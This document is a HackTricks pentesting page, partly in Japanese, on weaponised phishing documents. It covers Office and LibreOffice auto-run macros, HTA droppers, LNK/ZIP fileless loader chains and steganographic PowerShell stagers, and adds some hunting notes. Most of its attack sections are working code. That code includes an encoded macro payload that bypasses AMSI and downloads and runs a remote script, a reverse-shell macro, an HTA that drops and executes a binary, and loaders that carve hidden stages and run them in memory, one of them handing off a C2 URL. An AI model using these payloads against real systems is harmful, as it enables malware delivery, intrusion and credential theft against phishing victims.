# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word は、ファイルを開く前にファイルデータの検証を実行します。データ検証は、OfficeOpenXML standard に照らしたデータ構造の識別という形で実行されます。データ構造の識別中にエラーが発生した場合、分析中のファイルは開かれません。

通常、macros を含む Word ファイルは `.docm` 拡張子を使用します。ただし、ファイル拡張子を変更してファイル名を変更しても、macro の実行機能を維持することが可能です。\
たとえば、RTF ファイルは設計上 macros をサポートしていません。しかし、DOCM ファイルの名前を RTF に変更すると、Microsoft Word によって処理され、macro を実行できるようになります。\
同じ内部構造とメカニズムが、Microsoft Office Suite のすべてのソフトウェア（Excel、PowerPoint など）に適用されます。

一部の Office プログラムによって実行される拡張子を確認するには、次のコマンドを使用できます。
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### External Image Load

Go to: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

ドキュメントから任意のコードを実行するために macros を使用できます。

#### Autoload functions

一般的なものほど、AV に検出される可能性が高くなります。

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### メタデータを手動で削除

**File > Info > Inspect Document > Inspect Document** の順に移動すると、Document Inspector が表示されます。**Inspect** をクリックし、**Document Properties and Personal Information** の横にある **Remove All** をクリックします。

#### Doc Extension

完了したら、**Save as type** のドロップダウンを選択し、形式を **`.docx`** から Word 97-2003 **`.doc`** に変更します。\
これは、**`.docx` 内には macro を保存できず**、macro-enabled **`.docm`** 拡張子には**偏見**があるためです（例：サムネイルアイコンに大きな `!` が表示され、一部の web/email gateway では完全にブロックされます）。そのため、この**legacy `.doc` 拡張子が最善の妥協案**です。

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer ドキュメントには Basic macros を埋め込み、macro を **Open Document** event にバインドすることで、ファイルを開いたときに自動実行できます（Tools → Customize → Events → Open Document → Macro…）。<sup>[[1]](#references)</sup> シンプルな reverse shell macro は次のようになります。
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
二重引用符（`""`）が文字列内にあることに注意してください。LibreOffice Basicでは、リテラルの引用符をエスケープするために二重引用符を使用します。そのため、`...==""")`で終わるpayloadでは、内部のコマンドとShell argumentの両方のバランスが保たれます。

Delivery tips:

- `.odt`として保存し、ドキュメントイベントにmacroをバインドして、開いた直後に実行されるようにします。
- `swaks`でメールを送信する場合は、`--attach @resume.odt`を使用します（ファイル名の文字列ではなく、ファイルのバイト列を添付ファイルとして送信するため、`@`が必要です）。これは、検証なしで任意の`RCPT TO` recipientを受け入れるSMTPサーバーをabuseする場合に重要です。

## HTAファイル

HTAは、**HTMLとスクリプト言語（VBScriptやJScriptなど）を組み合わせた**Windowsプログラムです。ユーザーインターフェースを生成し、ブラウザのsecurity modelによる制約を受けずに、「fully trusted」applicationとして実行されます。

HTAは**`mshta.exe`**を使用して実行されます。通常、**Internet Explorer**とともにインストールされるため、**`mshta`はIEに依存します**。そのため、IEがuninstallされている場合、HTAは実行できません。
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authentication の強制

**「リモートで」NTLM authentication を強制する方法**はいくつかあります。たとえば、ユーザーがアクセスするメールや HTML に**非表示の画像**を追加できます（HTTP MitM も可能です）。また、**フォルダーを開くだけで** **authentication** を**トリガーする**ファイルの**アドレス**を被害者に送信することもできます。

**以下のページで、これらのアイデアやその他の方法を確認してください：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

hash や authentication を盗むだけでなく、**NTLM relay attacks** も**実行できる**ことを忘れないでください：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

非常に効果的な campaign では、2 つの正規の decoy documents（PDF/DOCX）と悪意のある .lnk を含む ZIP を配布します。ポイントは、実際の PowerShell loader が ZIP の raw bytes 内に一意の marker の後ろへ格納され、.lnk がそれを carve して完全にメモリ上で実行することです。<sup>[[2]](#references)</sup>

.lnk の PowerShell one-liner によって実装される一般的な flow：

1) Desktop、Downloads、Documents、%TEMP%、%ProgramData%、および現在の working directory の parent にある一般的な path から、元の ZIP を特定する。
2) ZIP bytes を読み込み、hardcoded marker（例：xFIQCV）を検索する。marker より後ろにあるすべてのデータが、埋め込まれた PowerShell payload となる。
3) ZIP を %ProgramData% にコピーしてそこへ展開し、正規のファイルに見せかけるため decoy .docx を開く。
4) 現在の process に対して AMSI を bypass する：[System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 次の stage を deobfuscate し（例：すべての # 文字を削除する）、メモリ上で実行する。

埋め込まれた stage を carve して実行する PowerShell skeleton の例：
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
注記
- Delivery では、信頼できる PaaS サブドメイン（例: `*.herokuapp.com`）が悪用されることが多く、payload にゲートを設ける場合があります（IP/UA に基づいて無害な ZIP を配信するなど）。
- 次の stage では、base64/XOR shellcode を復号し、Reflection.Emit + VirtualAlloc 経由で実行して、ディスク上の痕跡を最小限に抑えることが頻繁に行われます。

同じ chain で使用される Persistence
- Microsoft Web Browser control の COM TypeLib hijacking により、IE/Explorer またはそれを埋め込む任意のアプリが payload を自動的に再起動します。<sup>[[2]](#references)[[4]](#references)</sup> 詳細とすぐに使用できる commands はこちらを参照してください:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- アーカイブデータの末尾に ASCII marker string（例: xFIQCV）が付加された ZIP files。
- 親フォルダおよび user フォルダを列挙して ZIP を見つけ、decoy document を開く .lnk。
- [System.Management.Automation.AmsiUtils]::amsiInitFailed による AMSI tampering。
- 信頼できる PaaS domains 配下でホストされた links で終了する、長時間継続する business threads。

## LNK の decoy-first staging → scheduled-task persistence → trusted CPL side-loading

もう 1 つの繰り返し見られる pattern は、バックグラウンドで実際の chain を staging しながら、無害な lure を直ちに開く **document-impersonating `.lnk`** です。<sup>[[3]](#references)</sup>

観測された workflow:
1. shortcut は **PDF を装い**、`conhost.exe` または類似の proxy を使用して、obfuscated PowerShell downloader を spawn します。
2. PowerShell は明白な tokens（`iw''r`、`g''c''i`、`r''e''n`、`c''p''i`、`&(g''cm sch*)`）を fragment 化するため、`iwr`、`gci`、`ren`、`cpi`、`schtasks` を探す naive detections では command を見逃します。
3. stager は最初に **decoy document を download** し、victim のために開いた後、バックグラウンドで malicious files を再構築します。
4. payloads は **junk extensions** を付けて書き込まれ、その後 filler characters を削除して rename される場合があります。これにより、明白な `.exe` / `.cpl` artifacts の出現が遅延します。
5. user-writable path から trusted host binary を launch する **minute-based scheduled task** により Persistence が確立されます。

この pattern における最小限の hunting clues:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
認識しておくと有用な staging レイアウトは次のとおりです。
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` または `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### second stage が stealthy である理由

Rapid7 の case study では、scheduled task が **`C:\Users\Public\`** から **`Fondue.exe`** を繰り返し起動していました。**`APPWIZ.cpl`** がその隣に staging され、**`RunFODW`** を export していたため、trusted な Microsoft binary は正規の system copy ではなく、attacker の CPL を side-load しました。

CPL は次の処理を行います。
- **AES-256-CBC** の blob を `C:\Windows\Tasks\editor.dat` から読み取る
- **Windows CNG / `bcrypt.dll`** を介して decrypt する
- executable memory を allocate し、decrypt した shellcode を copy する
- shellcode pointer を **`EnumUILanguagesW`** の callback として渡し、間接的に execute する

この最後のステップは個別に hunting する価値があります。malware は、直接的な `((void(*)())buf)()` jump を避け、代わりに **正規の callback を受け取る WinAPI** を悪用して execution を移すことがよくあります。

この campaign で decrypt された payload は **Donut** shellcode でした。その後、最終 PE を完全に memory 内へ map し、execution を引き渡す前に current process 内の **AMSI/WLDP/ETW** を patch しました。side-loading と memory-resident post-processing の詳細については、次を参照してください。

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

実践的な hunting pivot:
- `.lnk` が `powershell.exe` または `conhost.exe` を spawn し、その後に目に見える decoy document が表示されるケース。
- **`C:\Users\Public\`** への短時間の download の後、nonsense extension から直ちに rename されるケース。
- `GoogleErrorReport` のような目立たない名前で、**user-writable directory** から実行される scheduled task。
- 同じ non-system directory から **`.cpl` / `.dll`** ファイルを load する trusted binary。
- **`C:\Windows\Tasks\`** 配下に書き込まれ、side-loaded module によって読み取られる Base64 text blob。

## 画像内の steganography-delimited payload（PowerShell stager）

Recent loader chain では、obfuscated JavaScript/VBS を配布し、それが decode して Base64 PowerShell stager を実行します。この stager は image（多くの場合 GIF）を download します。その image には、固有の start/end marker の間に plain text として隠された、Base64-encoded .NET DLL が含まれています。script はこれらの delimiter（実際の環境で確認された例: «<<sudo_png>> … <<sudo_odt>>>»）を検索し、間の text を extract して Base64-decode し、assembly を memory 内に load したうえで、C2 URL とともに既知の entry method を invoke します。<sup>[[5]](#references)</sup>

ワークフロー
- Stage 1: Archived JS/VBS dropper → embedded Base64 を decode → `-nop -w hidden -ep bypass` を指定して PowerShell stager を launch。
- Stage 2: PowerShell stager → image を download し、marker-delimited Base64 を carve して、.NET DLL を memory 内に load し、C2 URL と options を渡してその method（例: VAI）を call。
- Stage 3: Loader が final payload を retrieve し、通常は process hollowing によって trusted binary（一般的には MSBuild.exe）へ inject。<sup>[[7]](#references)[[8]](#references)</sup> process hollowing と trusted utility proxy execution の詳細については、次を参照してください。

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

image から DLL を carve し、memory 内で .NET method を invoke する PowerShell の例:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

メモ
- これは ATT&CK T1027.003（steganography/marker-hiding）です。<sup>[[6]](#references)</sup> マーカーは campaign ごとに異なります。
- AMSI/ETW bypass と string deobfuscation は、assembly を loading する前に一般的に適用されます。
- Hunting: downloaded images を既知の delimiter について scan し、images にアクセスして直後に Base64 blobs を decoding する PowerShell を特定します。

以下の stego tools と carving techniques も参照してください。

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

繰り返し現れる initial stage は、archive 内に配信される小さく、非常に heavily-obfuscated な `.js` または `.vbs` です。その唯一の目的は、埋め込まれた Base64 string を decode し、`-nop -w hidden -ep bypass` を指定して PowerShell を launch し、HTTPS 経由で次の stage を bootstrap することです。<sup>[[5]](#references)</sup>

Skeleton logic（抽象化）:
- 自身の file contents を読み取る
- junk strings 間にある Base64 blob を locate する
- ASCII PowerShell に decode する
- `powershell.exe` を invoke する `wscript.exe`/`cscript.exe` で execute する

Hunting cues
- command line に `-enc`/`FromBase64String` を含み、`powershell.exe` を spawn する archived JS/VBS attachments。
- user temp paths から `powershell.exe -nop -w hidden` を launch する `wscript.exe`。

## NTLM hashes を steal する Windows files

**places to steal NTLM creds** に関するページを確認してください:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
